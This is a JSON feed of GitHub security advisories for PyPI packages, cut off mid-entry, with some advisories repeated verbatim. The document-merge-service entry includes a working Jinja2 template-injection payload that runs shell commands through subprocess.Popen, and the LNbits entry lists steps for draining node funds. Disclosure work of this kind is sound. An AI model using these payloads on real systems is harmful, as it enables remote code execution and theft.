{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>When using urllib3's proxy support with <code>ProxyManager</code>, the <code>Proxy-Authorization</code> header is only sent to the configured proxy, as expected.</p>\n<p>However, when sending HTTP requests <em>without</em> using urllib3's proxy support, it's possible to accidentally configure the <code>Proxy-Authorization</code> header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the <code>Proxy-Authorization</code> HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.</p>\n<p>Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the <code>Proxy-Authorization</code> header during cross-origin redirects to avoid the small chance that users are doing this on accident.</p>\n<p>Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the <code>Proxy-Authorization</code> header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.</p>\n<h2 id=\"affected-usages\">Affected usages</h2>\n<p>We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:</p>\n<ul>\n<li>Setting the <code>Proxy-Authorization</code> header without using urllib3's built-in proxy support.</li>\n<li>Not disabling HTTP redirects.</li>\n<li>Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.</li>\n</ul>\n<h2 id=\"remediation\">Remediation</h2>\n<ul>\n<li>Using the <code>Proxy-Authorization</code> header with urllib3's <code>ProxyManager</code>.</li>\n<li>Disabling HTTP redirects using <code>redirects=False</code> when sending requests.</li>\n<li>Not using the <code>Proxy-Authorization</code> header.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37891\">https://nvd.nist.gov/vuln/detail/CVE-2024-37891</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468\">https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e\">https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/advisories/GHSA-34jh-p97f-mpxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf",
            "title": "[urllib3] urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
            "date_modified": "2024-06-17T21:37:23.000Z",
            "date_published": "2024-06-17T21:37:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When using urllib3's proxy support with <code>ProxyManager</code>, the <code>Proxy-Authorization</code> header is only sent to the configured proxy, as expected.</p>\n<p>However, when sending HTTP requests <em>without</em> using urllib3's proxy support, it's possible to accidentally configure the <code>Proxy-Authorization</code> header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the <code>Proxy-Authorization</code> HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.</p>\n<p>Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the <code>Proxy-Authorization</code> header during cross-origin redirects to avoid the small chance that users are doing this on accident.</p>\n<p>Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the <code>Proxy-Authorization</code> header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.</p>\n<h2 id=\"affected-usages\">Affected usages</h2>\n<p>We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:</p>\n<ul>\n<li>Setting the <code>Proxy-Authorization</code> header without using urllib3's built-in proxy support.</li>\n<li>Not disabling HTTP redirects.</li>\n<li>Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.</li>\n</ul>\n<h2 id=\"remediation\">Remediation</h2>\n<ul>\n<li>Using the <code>Proxy-Authorization</code> header with urllib3's <code>ProxyManager</code>.</li>\n<li>Disabling HTTP redirects using <code>redirects=False</code> when sending requests.</li>\n<li>Not using the <code>Proxy-Authorization</code> header.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37891\">https://nvd.nist.gov/vuln/detail/CVE-2024-37891</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468\">https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e\">https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/advisories/GHSA-34jh-p97f-mpxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf",
            "title": "[urllib3] urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
            "date_modified": "2024-06-17T21:37:23.000Z",
            "date_published": "2024-06-17T21:37:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Paying invoices in Eclair that do not get settled within the internal timeout (about 30s) lead to a payment being considered failed, even though it may still be in flight.</p>\n<h3 id=\"details\">Details</h3>\n<p>Using <code>blocking: true</code> on the API call will lead to a timeout error if a payment does not get settled in the 30s timeout with the error: <code>Ask timed out on [Actor[akka://eclair-node/user/$l#134241942]] after [30000 ms]. Message of type [fr.acinq.eclair.payment.send.PaymentInitiator$SendPaymentToNode]. A typical reason for AskTimeoutException is that the recipient actor didn't send a reply.</code>\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L138\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L138</a></p>\n<p>This is considered a payment failure by parts of the code, and assumes the payment is not going to be settled after:\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L144\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L144</a>\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L141\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L141</a>\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L146\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L146</a></p>\n<p>The best way to fix this is to check the payment status after an error, and when not sure, always consider a payment still in flight.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>A very simple way to exploit this is:</p>\n<ul>\n<li>Create a hold invoice</li>\n<li>Pay the invoice with the LNbits server backed by an Eclair node, until it times out</li>\n<li>Settle the hold invoice</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can lead to a total loss of funds for the node backend.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lnbits/lnbits/security/advisories/GHSA-3j4h-h3fp-vwww\">https://github.com/lnbits/lnbits/security/advisories/GHSA-3j4h-h3fp-vwww</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34694\">https://nvd.nist.gov/vuln/detail/CVE-2024-34694</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3j4h-h3fp-vwww\">https://github.com/advisories/GHSA-3j4h-h3fp-vwww</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3j4h-h3fp-vwww",
            "title": "[lnbits] LNbits improperly handles potential network and payment failures when using Eclair backend",
            "date_modified": "2024-06-17T21:24:18.000Z",
            "date_published": "2024-06-17T21:24:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3j4h-h3fp-vwww"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Use of Web Browser Cache Containing Sensitive Information vulnerability in Apache Airflow.&nbsp;</p>\n<p>Airflow did not return \"Cache-Control\" header for dynamic content, which in case of some browsers could result in potentially storing sensitive data in local cache of the browser.</p>\n<p>This issue affects Apache Airflow: before 2.9.2.</p>\n<p>Users are recommended to upgrade to version 2.9.2, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-25142\">https://nvd.nist.gov/vuln/detail/CVE-2024-25142</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/39550\">https://github.com/apache/airflow/pull/39550</a></li>\n<li><a href=\"https://lists.apache.org/thread/cg1j28lk0fhzthk0of1g7vy7p2n1j7nr\">https://lists.apache.org/thread/cg1j28lk0fhzthk0of1g7vy7p2n1j7nr</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/94eb647de692a4d9555b02dce85974da5d4c04e3\">https://github.com/apache/airflow/commit/94eb647de692a4d9555b02dce85974da5d4c04e3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9xpj-62mm-24h2\">https://github.com/advisories/GHSA-9xpj-62mm-24h2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9xpj-62mm-24h2",
            "title": "[apache-airflow] Apache Airflow does not return the \"Cache-Control\" header for dynamic content",
            "date_modified": "2024-06-17T21:24:09.000Z",
            "date_published": "2024-06-14T09:31:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9xpj-62mm-24h2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>langchain_experimental (aka LangChain Experimental) before 0.0.61 for LangChain provides Python REPL access without an opt-in step. NOTE; this issue exists because of an incomplete fix for CVE-2024-27444.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38459\">https://nvd.nist.gov/vuln/detail/CVE-2024-38459</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/22860\">https://github.com/langchain-ai/langchain/pull/22860</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/ce0b0f22a175139df8f41cdcfb4d2af411112009\">https://github.com/langchain-ai/langchain/commit/ce0b0f22a175139df8f41cdcfb4d2af411112009</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/compare/langchain-experimental==0.0.60...langchain-experimental==0.0.61\">https://github.com/langchain-ai/langchain/compare/langchain-experimental==0.0.60...langchain-experimental==0.0.61</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langchain-experimental/PYSEC-2024-53.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langchain-experimental/PYSEC-2024-53.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wmvm-9vqv-5qpp\">https://github.com/advisories/GHSA-wmvm-9vqv-5qpp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wmvm-9vqv-5qpp",
            "title": "[langchain-experimental] langchain_experimental Code Execution via Python REPL access",
            "date_modified": "2024-06-17T21:21:49.000Z",
            "date_published": "2024-06-16T15:30:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wmvm-9vqv-5qpp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Denial of service in <code>SitemapLoader</code> Document Loader in the <code>langchain-community</code> package, affecting versions below 0.2.5. The <code>parse_sitemap</code> method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2965\">https://nvd.nist.gov/vuln/detail/CVE-2024-2965</a></li>\n<li><a href=\"https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae\">https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/22903\">https://github.com/langchain-ai/langchain/pull/22903</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/9a877c7adbd06f90a2518152f65b562bd90487cc\">https://github.com/langchain-ai/langchain/commit/9a877c7adbd06f90a2518152f65b562bd90487cc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hjh-jh2h-vrg6\">https://github.com/advisories/GHSA-3hjh-jh2h-vrg6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hjh-jh2h-vrg6",
            "title": "[langchain-community] Denial of service in langchain-community",
            "date_modified": "2024-06-14T23:25:32.000Z",
            "date_published": "2024-06-06T21:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hjh-jh2h-vrg6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>We have identified a Cross-Site Scripting (XSS) vulnerability within certain React components related to community members in the Invenio-Communities module. This vulnerability enables a user to inject a script tag into the Affiliations field during the account registration process. The malicious script is executed when the user creates a new community and is listed as a public member.</p>\n<p>The script is triggered whenever any user visits the Members section of any community that includes the compromised user. This can potentially allow the attacker to access personal information, such as cookies, of the visiting user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>The problem has been patched in <a href=\"https://github.com/inveniosoftware/invenio-communities/releases/tag/v7.8.0\">v7.8.0</a>. Patches also have been backported in versions <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v4.2.2\">v4.2.2</a> and <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v2.8.11\">v2.8.11</a>.</p>\n<h1 id=\"credits\">Credits</h1>\n<p>Thanks to <a href=\"https://x.com/AliGoodLuck11\">Twitter.com/AliGoodLuck11</a>  for reporting the vulnerability with a detailed description on how to reproduce it!</p>\n<h1 id=\"for-more-information\">For more information</h1>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:info@inveniosoftware.org\">info@inveniosoftware.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f\">https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698\">https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce\">https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac\">https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/advisories/GHSA-hjx6-f647-mvf9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9",
            "title": "[invenio-communities] Invenio-Communities has a Cross-Site Scripting (XSS) vulnerability in React components",
            "date_modified": "2024-06-12T19:43:05.000Z",
            "date_published": "2024-06-12T19:43:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>We have identified a Cross-Site Scripting (XSS) vulnerability within certain React components related to community members in the Invenio-Communities module. This vulnerability enables a user to inject a script tag into the Affiliations field during the account registration process. The malicious script is executed when the user creates a new community and is listed as a public member.</p>\n<p>The script is triggered whenever any user visits the Members section of any community that includes the compromised user. This can potentially allow the attacker to access personal information, such as cookies, of the visiting user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>The problem has been patched in <a href=\"https://github.com/inveniosoftware/invenio-communities/releases/tag/v7.8.0\">v7.8.0</a>. Patches also have been backported in versions <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v4.2.2\">v4.2.2</a> and <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v2.8.11\">v2.8.11</a>.</p>\n<h1 id=\"credits\">Credits</h1>\n<p>Thanks to <a href=\"https://x.com/AliGoodLuck11\">Twitter.com/AliGoodLuck11</a>  for reporting the vulnerability with a detailed description on how to reproduce it!</p>\n<h1 id=\"for-more-information\">For more information</h1>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:info@inveniosoftware.org\">info@inveniosoftware.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f\">https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698\">https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce\">https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac\">https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/advisories/GHSA-hjx6-f647-mvf9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9",
            "title": "[invenio-communities] Invenio-Communities has a Cross-Site Scripting (XSS) vulnerability in React components",
            "date_modified": "2024-06-12T19:43:05.000Z",
            "date_published": "2024-06-12T19:43:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>We have identified a Cross-Site Scripting (XSS) vulnerability within certain React components related to community members in the Invenio-Communities module. This vulnerability enables a user to inject a script tag into the Affiliations field during the account registration process. The malicious script is executed when the user creates a new community and is listed as a public member.</p>\n<p>The script is triggered whenever any user visits the Members section of any community that includes the compromised user. This can potentially allow the attacker to access personal information, such as cookies, of the visiting user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>The problem has been patched in <a href=\"https://github.com/inveniosoftware/invenio-communities/releases/tag/v7.8.0\">v7.8.0</a>. Patches also have been backported in versions <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v4.2.2\">v4.2.2</a> and <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v2.8.11\">v2.8.11</a>.</p>\n<h1 id=\"credits\">Credits</h1>\n<p>Thanks to <a href=\"https://x.com/AliGoodLuck11\">Twitter.com/AliGoodLuck11</a>  for reporting the vulnerability with a detailed description on how to reproduce it!</p>\n<h1 id=\"for-more-information\">For more information</h1>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:info@inveniosoftware.org\">info@inveniosoftware.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f\">https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698\">https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce\">https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac\">https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/advisories/GHSA-hjx6-f647-mvf9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9",
            "title": "[invenio-communities] Invenio-Communities has a Cross-Site Scripting (XSS) vulnerability in React components",
            "date_modified": "2024-06-12T19:43:05.000Z",
            "date_published": "2024-06-12T19:43:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>A remote code execution (RCE) via server-side template injection (SSTI) allows for user supplied code to be executed in the server's context where it is executed as the document-merge-server user with the UID 901 thus giving an attacker considerable control over the container.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>It has not been patched.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti\">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti</a></li>\n</ul>\n<h3 id=\"poc\">POC</h3>\n<p>Add the following to a document, upload and render it:</p>\n<pre><code class=\"language-jinja2\">{% if PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202] %} \nls -a: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"ls -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nwhoami: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"whoami\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nuname -a:\n{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"uname -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\n{% endif %}\n</code></pre>\n<p>The index might be different, so to debug this first render a template with <code>{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__() }}</code> and then get the index of <code>subprocess.Popen</code> and replace 202 with that.</p>\n<p><img alt=\"image\" src=\"https://github.com/adfinis/document-merge-service/assets/110528300/0a1dfcff-2eba-40f1-af9c-08c8ec2bc0a1\"></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6\">https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37301\">https://nvd.nist.gov/vuln/detail/CVE-2024-37301</a></li>\n<li><a href=\"https://github.com/adfinis/document-merge-service/commit/a1edd39d33d1bdf75c31ea01c317547be90ca074\">https://github.com/adfinis/document-merge-service/commit/a1edd39d33d1bdf75c31ea01c317547be90ca074</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v5gf-r78h-55q6\">https://github.com/advisories/GHSA-v5gf-r78h-55q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v5gf-r78h-55q6",
            "title": "[document-merge-service] document-merge-service vulnerable to Remote Code Execution via Server-Side Template Injection",
            "date_modified": "2024-06-12T19:21:02.000Z",
            "date_published": "2024-06-11T20:22:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v5gf-r78h-55q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>WordOps through 3.20.0 has a <code>wo/cli/plugins/stack_pref.py</code> TOCTOU race condition because the <code>conf_path</code> <code>os.open</code> does not use a mode parameter during file creation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34528\">https://nvd.nist.gov/vuln/detail/CVE-2024-34528</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/issues/611\">https://github.com/WordOps/WordOps/issues/611</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/blob/ecf20192c7853925e2cb3f8c8378cd0d86ca0d62/wo/cli/plugins/stack_pref.py#L77\">https://github.com/WordOps/WordOps/blob/ecf20192c7853925e2cb3f8c8378cd0d86ca0d62/wo/cli/plugins/stack_pref.py#L77</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/commit/31353f0fef14ad8bc1f61c028971bd30b9e1909b\">https://github.com/WordOps/WordOps/commit/31353f0fef14ad8bc1f61c028971bd30b9e1909b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-23qq-p4gq-gc2g\">https://github.com/advisories/GHSA-23qq-p4gq-gc2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-23qq-p4gq-gc2g",
            "title": "[wordops] WordOps has TOCTOU race condition",
            "date_modified": "2024-06-12T17:20:04.000Z",
            "date_published": "2024-05-06T00:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-23qq-p4gq-gc2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>JupyterHub &lt; 5.0, when used with <code>GlobusOAuthenticator</code>, could be configured to allow all users from a particular institution only. The configuration for this would look like:</p>\n<pre><code class=\"language-python\"># Require users to be using the \"foo.horse\" identity provider, often an institution or university\nc.GlobusAuthenticator.identity_provider = \"foo.horse\"\n# Allow everyone who has that identity provider to log in\nc.GlobusAuthenticator.allow_all = True\n</code></pre>\n<p>This worked fine prior to JupyterHub 5.0, because <code>allow_all</code> <em>did not</em> take precedence over <code>identity_provider</code>.</p>\n<p>Since JupyterHub 5.0, <code>allow_all</code> <em>does</em> take precedence over <code>identity_provider</code>. On a hub with the same config, now <strong>all</strong> users will be allowed to login, regardless of <code>identity_provider</code>. <code>identity_provider</code> will basically be ignored.</p>\n<p>This is a <a href=\"https://jupyterhub.readthedocs.io/en/stable/howto/upgrading-v5.html#authenticator-allow-all-and-allow-existing-users\">documented change</a> in JupyterHub 5.0,\nbut is likely to catch many users by surprise.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>OAuthenticator 16.3.1 fixes the issue with JupyterHub 5.0, and does not affect previous versions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not upgrade to JupyterHub 5.0 when using <code>GlobusOAuthenticator</code> in the prior configuration.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-gprj-3p75-f996\">https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-gprj-3p75-f996</a></li>\n<li><a href=\"https://github.com/jupyterhub/oauthenticator/commit/d1aea05fa89f2beae15ab0fa0b0d071030f79654\">https://github.com/jupyterhub/oauthenticator/commit/d1aea05fa89f2beae15ab0fa0b0d071030f79654</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37300\">https://nvd.nist.gov/vuln/detail/CVE-2024-37300</a></li>\n<li><a 